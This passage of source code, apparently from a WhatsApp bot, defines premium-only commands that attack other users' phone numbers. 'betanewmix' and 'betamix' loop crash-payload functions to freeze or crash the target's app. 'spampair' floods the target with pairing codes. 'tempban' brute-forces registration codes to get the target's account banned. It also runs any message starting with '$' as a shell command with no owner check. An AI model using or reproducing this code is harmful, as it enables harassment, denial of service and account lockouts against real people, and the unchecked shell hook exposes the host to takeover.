		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "Z A N G E T S U C R A S H", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
		 				await FxZIvS(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await sendCrash(X)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await StuckNull(X, XnxxzangetsuBug, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await Thezangetsu.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
						await GlxCall(X, XnxxzangetsuBug, cct = true, ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
	         				}
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : GhøstNøtîf*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
					case 'betanewmix': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : betanewmix 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : betanewmix 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				await TheFaxz.sendMessage(m.chat, { react: { text: `☠`, key: m.key }})
					TheFaxzReply(`*☠X-Çràsher☠*`)
					
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
		 				await FxZIvS(X, Ptcp = true)
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await sendCrash(X)
						await FxZxTxOs(X, Ptcp = true)
						await StuckSql(X, XnxxFaxzBug, Ptcp = true)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await Gsz(X, FAXZxCRASH)
						await Tedex(X, dottm)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
	         				}
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : ÇràshMîx*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
			                 	    	case 'betamix': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : betamix 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : betamix 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				await TheFaxz.sendMessage(m.chat, { react: { text: `☠`, key: m.key }})
					TheFaxzReply(`*☠X-Çràsher☠*`)
					
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
                        await NuLLxLoCx(X, XnxxFaxzBug, Ptcp = true)
                        await VxEtC(X)
                        await NuLLxLocFxZ(X, XnxxFaxzBug, Ptcp = true)
                        await FxZxTxOs(X, Ptcp = true)
                        await NuLLxLoCx(X, XnxxFaxzBug, Ptcp = true)
                        await VxEtC(X)
                        await NuLLxLocFxZ(X, XnxxFaxzBug, Ptcp = true)
						await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
						await FxZxTxOs(X, Ptcp = true)
                        await NuLLxLoCx(X, XnxxFaxzBug, Ptcp = true)
                        await VxEtC(X)
                        await NuLLxLocFxZ(X, XnxxFaxzBug, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
	         				}
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : VxMîx*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
   case 'spampair': {
			if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
			if (!q) return TheFaxzReply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`)
			let [peenis, pepekk = "200"] = q.split("|")
			await TheFaxzReply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚 🍂`)
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('latest')
			let {
				state
			} = await useMultiFileAuthState('XspamerX')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
		}
		break
		case 'tempban': {
	if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
	if (args.length < 1) return TheFaxzReply(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`);
	const args2 = args[0].split('|');
	if (args2.length !== 2) return TheFaxzReply(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`);
	const TheFaxzCountryCode = args2[0];
	const xtarget = args2[1];
	const TheFaxzNumber = xtarget.replace('@s.whatsapp.net', '');
	const TheFaxzmerge = `${TheFaxzCountryCode}${xtarget}`
	const TheFaxzMention = TheFaxzmerge + '@s.whatsapp.net';
	await TheFaxzReply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚 🍂`)
	try {
		const {
			stateTheFaxz,
			saveCredsTheFaxz
		} = await useMultiFileAuthState('./TheSpamer');
		const TheFaxzRequest = await TheFaxz.requestRegistrationCode({
			phoneNumber: '+' + TheFaxzCountryCode + `${TheFaxzNumber}`,
			phoneNumberCountryCode: TheFaxzCountryCode,
			phoneNumberNationalNumber: `${TheFaxzNumber}`,
			phoneNumberMobileCountryCode: 724,
			method: 'sms'
		});
	} catch (err) {}

	for (let i = 0; i < 10000; i++) {
		try {
			var TheFaxzPrefix = Math.floor(Math.random() * 999);
			var TheFaxzSuffix = Math.floor(Math.random() * 999);
			await TheFaxz.register(`${TheFaxzPrefix}-${TheFaxzSuffix}`);
		} catch (err) {
			console.log(`${TheFaxzPrefix}-${TheFaxzSuffix}`);
		}
	}
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return TheFaxzReply(err)
if (stdout) return TheFaxzReply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return TheFaxzReply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await TheFaxzReply(evaled)
} catch (err) {
TheFaxzReply(String(err))
}
}
} catch (e) {
console.log(e)
TheFaxz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})